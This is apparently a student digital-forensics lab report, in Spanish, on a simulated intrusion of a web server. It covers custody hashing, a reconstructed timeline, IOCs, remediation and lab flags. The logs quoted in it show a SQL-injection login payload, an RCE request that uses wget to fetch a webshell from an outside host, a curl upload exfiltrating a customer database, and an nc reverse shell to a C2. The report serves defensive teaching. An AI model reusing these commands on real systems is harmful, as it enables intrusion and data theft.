# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 09
**Investigadores:**
- Santiago Cocchi (legajo 15271) — @santicocchi
- Franco Ferraro (legajo 14973) — @francovalentin08
- Francisco Mossello (legajo 15339) — @FranMossello
- Tomas Spat (legajo 15055) — @TomiSpat
- Santiago Torres (legajo 15059) — @santy500

**Fecha:** 2026-11-20
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

---

## 0. Declaración de uso de IA

Se usó un asistente de IA (Claude Code) para implementar `construir_timeline()`
y `clasificar_fase()` en `src/timeline.py`, ejecutar la verificación de la
cadena de custodia y correlacionar la evidencia, y redactar este informe. Los 5
hallazgos (flags) se extrajeron **de los archivos de evidencia reales** del
paquete del caso (`caso/logs`, `caso/disco`, `caso/memoria`), no de una fuente
externa. La evidencia original no fue modificada en ningún momento: todo el
análisis se hizo sobre copias de lectura de los archivos del caso.

---

## 1. Resumen del incidente

Un atacante externo (`185.220.101.42`) enumeró el portal `phantomcorp-web`,
encontró un panel de RRHH (`/portal-rrhh`) y lo comprometió con una inyección
SQL en su login (`admin'--`). Desde ahí, un archivo de configuración filtrado
(`/backup/rrhh.conf`) le dio un token de API que usó para ejecutar comandos
arbitrarios vía `/api/reporte?cmd=`, con el que descargó y dejó una webshell
persistente en `/var/www/uploads/shell.php`. Con esa webshell escaló a `root`
explotando un binario SUID (`system-check`, copia de `bash`), instaló
persistencia vía `cron`, y finalmente **exfiltró** la base de clientes
(`clientes.db.txt`) a un servidor externo (`45.13.37.7`) antes de cerrar la
conexión.

---

## 2. Cadena de custodia

Se verificó la integridad de cada archivo de evidencia recalculando su SHA-256
y comparándolo contra el valor registrado en `evidencia.sha256`.

> **Nota metodológica.** Al clonar el repositorio en Windows, Git normaliza los
> finales de línea de texto (LF → CRLF), lo que altera los bytes de **todos**
> los archivos de texto y hace que `sha256sum -c` directo reporte un falso
> `FAILED` generalizado. Para no confundir ese artefacto del entorno de trabajo
> con una alteración real de la evidencia, se normalizaron los finales de línea
> a LF **antes** de recalcular cada hash (`sed 's/\r$//' archivo | sha256sum`),
> reproduciendo las condiciones en que se generó `evidencia.sha256` originalmente.

```
$ cd caso
$ while read -r hash_reg archivo; do
    h=$(sed 's/\r$//' "$archivo" | sha256sum | cut -d' ' -f1)
    [ "$h" = "$hash_reg" ] && echo "$archivo: OK" || echo "$archivo: FAILED"
  done < <(sed 's/\r$//' evidencia.sha256)

disco/etc/passwd.snippet: OK
disco/listado.txt: OK
disco/var/www/uploads/shell.php.evidencia.txt: OK
logs/access.log: OK
logs/auth.log: FAILED
memoria/bash_history.txt: OK
memoria/lsof.txt: OK
memoria/netstat.txt: OK
memoria/pslist.txt: OK
```

**Resultado:** 8 de 9 archivos coinciden con su hash de captura. **`logs/auth.log`
falló la verificación** — su hash recalculado (`7d18039d...`) no coincide con el
registrado en la custodia. El propio archivo lo confirma: contiene un comentario
dejado por el forense original señalando que "alguien lo editó después de la
captura" y que recuperó, del *journal* del sistema, el marcador
`FLAG{dfir_custodia_alterada}`. **Conclusión:** `auth.log` fue alterado después
de capturarse (probablemente el atacante borró líneas que mostraban más de su
actividad SSH) y **no puede usarse como prueba confiable por sí solo** — solo
sirve en la medida en que el resto de la evidencia (memoria, otros logs) lo
corrobora de forma independiente.

---

## 3. Línea de tiempo del ataque

Reconstruida con `src/timeline.py` sobre `access.log` filtrando por la IP del
atacante, y correlacionada con disco y memoria:

```
$ python3 timeline.py ../caso/logs/access.log --ip 185.220.101.42
[*] 16 eventos de 185.220.101.42
  ...(ver salida completa en la sección 7 — Anexo)
```

| Hora (UTC) | Evento | Evidencia (archivo:línea) |
|---|---|---|
| 02:14:03 | Recon inicial del portal (`GET /`) | `access.log:6` |
| 02:14:19–02:14:22 | Enumeración de rutas con `gobuster` (`/robots.txt`, `/admin`, `/login`, `/backup`, `/portal-rrhh`, `/uploads`) | `access.log:7-12` |
| 02:16:40–02:17:22 | 3 intentos de login contra `/portal-rrhh/login`; el tercero con el payload SQLi `user=admin'--` devuelve `200` | `access.log:14-16` |
| 02:17:41 | Lectura del archivo filtrado `/backup/rrhh.conf` (fuga del token de API) | `access.log:17` |
| 02:18:10–02:18:33 | RCE vía `/api/reporte?cmd=`: primero `id`, luego un `echo` que deja el marcador del vector | `access.log:18-19` |
| 02:19:02 | `wget` vía RCE para descargar la webshell desde `45.13.37.7` a `/var/www/uploads/shell.php` | `access.log:20` |
| 02:19:19 | Creación del archivo de la webshell en disco (431 bytes) | `disco/listado.txt:4` |
| 02:19:48 | Primera ejecución de la webshell (`?c=whoami`) | `access.log:21` |
| 02:19:55 | Conexión SSH entrante desde la misma IP atacante, autenticada como `www-data` | `logs/auth.log:2` (⚠️ archivo con hash alterado, ver sección 2) |
| 02:20:31 | Intento fallido de `sudo` como `www-data` | `logs/auth.log:3` |
| 02:21:04 | Ejecución del binario SUID `system-check` (`audit: SUID exec ... euid=0`) — la escalada | `logs/auth.log:4`; corroborado por `memoria/pslist.txt:8` (`system-check <- SUID root; euid=0`) |
| 02:21 | Creación en disco del binario SUID `system-check` (copia de `bash`, 1.113.504 bytes) | `disco/listado.txt:5` |
| 02:22 | Creación de la persistencia vía cron (`/etc/cron.d/phantom-maint`) | `disco/listado.txt:6` |
| 02:23:15 | Lectura de `clientes.db.txt` vía webshell (respuesta de 48.210 bytes) | `access.log:22` |
| ~02:23 | Preparación del archivo de exfiltración `/tmp/.exfil/clientes.tar.gz` (mismo tamaño, 48.210 bytes) | `disco/listado.txt:7`; comando correspondiente en `memoria/bash_history.txt:7` |
| (sin hora exacta en access.log) | Exfiltración vía `curl -F` a `http://45.13.37.7/upload?tag=...` | `memoria/bash_history.txt:8` |
| (en curso al momento de la captura) | Reverse shell activa hacia el C2 (`nc 45.13.37.7:4444`) | `memoria/pslist.txt:9`; `memoria/netstat.txt:5` (conexión `ESTABLISHED`); `memoria/lsof.txt:3` |
| 02:45:00 | Cierre de la conexión SSH desde la IP atacante | `logs/auth.log:9` |

**Correlación clave (P3):** el `wget` a las 02:19:02 (`access.log:20`), la
creación del archivo `shell.php` en disco a las 02:19 (`disco/listado.txt:4`) y
la primera ejecución de la webshell a las 02:19:48 (`access.log:21`) son tres
evidencias **independientes** (un log de red, un timestamp de filesystem, y de
nuevo el log de red) que apuntan al mismo evento en la misma ventana de
segundos: la webshell se descargó, quedó escrita en disco, y el atacante la usó
casi de inmediato.

---

## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | `185.220.101.42` | `access.log` (todas las líneas del ataque), `auth.log` |
| IP:puerto C2 | `45.13.37.7:4444` | `memoria/pslist.txt` (proceso `nc`), `memoria/netstat.txt` (`ESTABLISHED`), `memoria/lsof.txt` |
| IP:puerto de descarga del payload | `45.13.37.7:80` | `memoria/netstat.txt` (`TIME_WAIT`, proceso `wget`), `access.log:20` |
| Archivo malicioso (webshell) | `/var/www/uploads/shell.php` | `disco/listado.txt`, `disco/var/www/uploads/shell.php.evidencia.txt`, `access.log` |
| Archivo de exfiltración preparado | `/tmp/.exfil/clientes.tar.gz` | `disco/listado.txt`, `memoria/bash_history.txt`, `memoria/lsof.txt` |
| Binario de escalada (SUID) | `/usr/local/bin/system-check` (copia de `bash`, `chmod 4755`) | `disco/listado.txt`, `memoria/pslist.txt` |
| Usuario backdoor | `phantom-svc` (UID/GID **0** — privilegios de root) | `disco/etc/passwd.snippet` |
| Persistencia | `/etc/cron.d/phantom-maint` | `disco/listado.txt` |
| Token de API filtrado | `phantom-api-7c1e` | `access.log` (parámetro `token=` en `/api/reporte`) |

---

## 5. Alcance del daño

El atacante **sí exfiltró datos**: la base de clientes completa
(`/app/priv/clientes.db.txt`, comprimida como `clientes.tar.gz`, 48.210 bytes —
el mismo tamaño exacto que la respuesta de la webshell al leer ese archivo en
`access.log:22`, lo que confirma que es el mismo contenido) fue subida al
servidor externo `45.13.37.7` mediante `curl -F`. El atacante **escaló a
root** (confirmado en tres fuentes independientes: kernel audit en `auth.log`,
proceso `system-check` con `euid=0` en `pslist.txt`, y el propio comando en
`bash_history.txt`). **Dejó dos mecanismos de persistencia**: un usuario
backdoor con UID 0 (`phantom-svc`) en `/etc/passwd`, y una entrada de `cron`
que relanza la webshell cada 5 minutos. Al momento de la captura de memoria
(02:30 UTC), el proceso `nc` con una conexión **`ESTABLISHED`** hacia el C2
seguía activo — es decir, **el atacante seguía teniendo acceso en vivo** en el
instante de la captura, no era solo un rastro de algo ya cerrado.

---

## 6. Contención y erradicación (recomendaciones)

1. **Cerrar el vector de entrada inmediato:** eliminar o deshabilitar el
   endpoint `/api/reporte` (o, como mínimo, invalidar el token
   `phantom-api-7c1e` filtrado en `/backup/rrhh.conf`) y corregir la SQLi en
   `/portal-rrhh/login` con consultas parametrizadas.
2. **Matar la conexión activa al C2:** terminar el proceso `nc` (PID 1490 según
   `pslist.txt`) y bloquear `45.13.37.7` a nivel de firewall de egress — es la
   acción más urgente, porque la sesión seguía viva al momento de la captura.
3. **Remover la persistencia:** borrar `/etc/cron.d/phantom-maint` y eliminar
   el usuario `phantom-svc` de `/etc/passwd` (y de `/etc/shadow`, si tiene
   contraseña configurada).
4. **Eliminar los artefactos dropeados:** borrar `/var/www/uploads/shell.php` y
   el binario SUID `/usr/local/bin/system-check`.
5. **Rotar credenciales:** cualquier secreto expuesto en `/backup/rrhh.conf`
   (y cualquier credencial que haya estado accesible mientras el atacante tuvo
   acceso de `root`) debe considerarse comprometido y rotarse — no solo el
   token de API, sino también credenciales de base de datos u otros servicios
   a los que ese host tuviera acceso.
6. **Notificar la exfiltración:** la base de clientes fue exfiltrada; esto
   dispara obligaciones de notificación según la Ley 25.326 (Protección de
   Datos Personales) si hay datos personales involucrados.
7. **Quitar el acceso de `www-data` al archivo `/backup/rrhh.conf`** desde el
   webroot (no debería ser accesible públicamente en primer lugar) y
   restringir el acceso de escritura de `www-data` sobre `/var/www/uploads`
   (lo que habría evitado dropear la webshell incluso con RCE).
8. **Remediar el binario SUID:** eliminar la copia de `bash` con SUID; auditar
   el sistema completo con `find / -perm -4000` buscando otros binarios SUID
   no estándar.

---

## 7. Preguntas de análisis

**P1 — por qué la RAM se captura antes que el disco, con un ejemplo de este caso.**
La memoria es el artefacto más **volátil**: se pierde por completo al apagar o
reiniciar el sistema, mientras que el disco persiste. Si se captura primero el
disco (un proceso que puede tardar) y la máquina se reinicia o el atacante la
apaga antes de llegar a la RAM, toda la información que solo vivía en memoria
desaparece para siempre. En este caso concreto, la conexión de red activa hacia
el C2 (`nc 45.13.37.7:4444`, `ESTABLISHED` en `netstat.txt`) es información que
**solo existe mientras el proceso sigue corriendo**: en el disco no hay ningún
archivo que registre "hay una conexión TCP abierta ahora mismo hacia tal IP".
Si se hubiera reiniciado la máquina antes de volcar la memoria, ese IOC —la
prueba más directa de que el atacante seguía con acceso en vivo— se habría
perdido sin dejar rastro alguno en el disco.

**P2 — cómo se supo que `auth.log` fue alterado, y por qué eso invalida la evidencia si no se documenta.**
Se supo recalculando el hash SHA-256 del archivo (normalizando los finales de
línea para descartar el ruido del entorno de trabajo en Windows) y comparándolo
contra el valor registrado en `evidencia.sha256` en el momento de la captura:
no coincidieron. Un hash SHA-256 que no coincide significa, con certeza
criptográfica práctica, que **el contenido del archivo cambió** desde que se
calculó ese hash — no hace falta saber *qué* cambió para saber *que* cambió.
Esto importa porque si no se documenta la discrepancia, un investigador (o un
tribunal) tomaría ese archivo como si fuera la captura original e intacta,
cuando en realidad alguien —muy probablemente el propio atacante, para
eliminar evidencia de su sesión SSH— lo editó después. Usar evidencia alterada
sin señalarlo como tal contamina cualquier conclusión que dependa de ese
archivo y, en un contexto legal, puede hacer que **toda la cadena de custodia
se cuestione**, no solo ese archivo puntual.

**P3 — tres artefactos correlacionados en el mismo evento con el mismo timestamp.**
Ver la sección 3 ("Correlación clave"): el `wget` que descarga la webshell
(`access.log:20`, 02:19:02), la creación del archivo `shell.php` en el
filesystem (`disco/listado.txt:4`, 02:19) y la primera invocación de esa
webshell (`access.log:21`, 02:19:48) son tres fuentes distintas —red, disco y
de nuevo red— que describen la misma secuencia de segundos: bajar el archivo,
que quede escrito, y usarlo. Ninguna de las tres por sí sola prueba el
encadenamiento completo con la misma fuerza que las tres juntas.

**P4 — por qué se pudo recuperar el historial de comandos aunque el atacante corrió `history -c`.**
`history -c` limpia el historial **en memoria de la sesión de shell actual** y,
según cómo esté configurado el shell, puede impedir que ese historial se
**escriba al archivo `.bash_history` en disco** al cerrar la sesión. Pero no
borra retroactivamente lo que el sistema operativo ya tenía cargado en **RAM**
mientras el proceso bash seguía vivo: el archivo `memoria/bash_history.txt` de
este caso aclara explícitamente que fue "recuperado de memoria" porque "el del
disco fue borrado por el atacante". Es la misma lógica de la P1 aplicada a otro
artefacto: lo que el atacante intentó borrar en un lugar (disco) seguía
existiendo en otro (memoria), porque el proceso de la shell no se había cerrado
—y por lo tanto no había "soltado" esa información— al momento de la captura.

**P5 — por qué un buen forense tiene que entender cómo ataca un pentester.**
Reconstruir esta cadena completa —SQLi → fuga de credenciales → RCE → webshell
→ privesc por SUID → persistencia por cron → exfiltración → C2— solo fue
posible porque, de los labs 05 a 09 de este curso, ya sabíamos **qué buscar en
cada capa**: un forense que nunca ejecutó una inyección SQL no reconocería el
payload `admin'--` en un log como lo que es; uno que nunca explotó un SUID no
entendería por qué el `audit: SUID exec ... euid=0` del kernel es la escalada
de privilegios y no una línea más de ruido; uno que nunca vio una reverse shell
no identificaría el proceso `nc` con una conexión `ESTABLISHED` como el C2
activo. La forense no es "leer archivos": es **reconocer la huella de técnicas
de ataque que ya se entienden de primera mano**. Cada artefacto de este caso es
el espejo de algo que hicimos nosotros mismos en los labs anteriores —y por eso
pudimos leerlo con criterio en vez de solo transcribirlo.

---

## Anexo — salida completa de `timeline.py`

```
$ python3 timeline.py ../caso/logs/access.log --ip 185.220.101.42
[*] 16 eventos de 185.220.101.42
  05/Sep/2026:02:14:03 +0000  GET  /                                        [RECON]
  05/Sep/2026:02:14:19 +0000  GET  /robots.txt                              [ENUM]
  05/Sep/2026:02:14:20 +0000  GET  /admin                                   [ENUM]
  05/Sep/2026:02:14:20 +0000  GET  /login                                   [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /backup                                  [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /portal-rrhh                             [ENUM]
  05/Sep/2026:02:14:22 +0000  GET  /uploads                                 [ENUM]
  05/Sep/2026:02:16:40 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:16:58 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:22 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:41 +0000  GET  /backup/rrhh.conf                        [EXPLOIT]
  05/Sep/2026:02:18:10 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=id [RCE]
  05/Sep/2026:02:18:33 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p [RCE]
  05/Sep/2026:02:19:02 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php [RCE]
  05/Sep/2026:02:19:48 +0000  GET  /uploads/shell.php?c=whoami              [WEBSHELL]
  05/Sep/2026:02:23:15 +0000  GET  /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt [WEBSHELL]
```

## Anexo — flags capturadas

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 11                     │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Vector de entrada (SQLi -> RCE) en los logs
   ✓  R2     El webshell dropeado en el disco
   ✓  R3     Escalada de privilegios (SUID) en memoria
   ✓  R4     Conexion C2 y exfiltracion de datos
   ✓  R5     Cadena de custodia: evidencia alterada

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 11 COMPLETO!
```
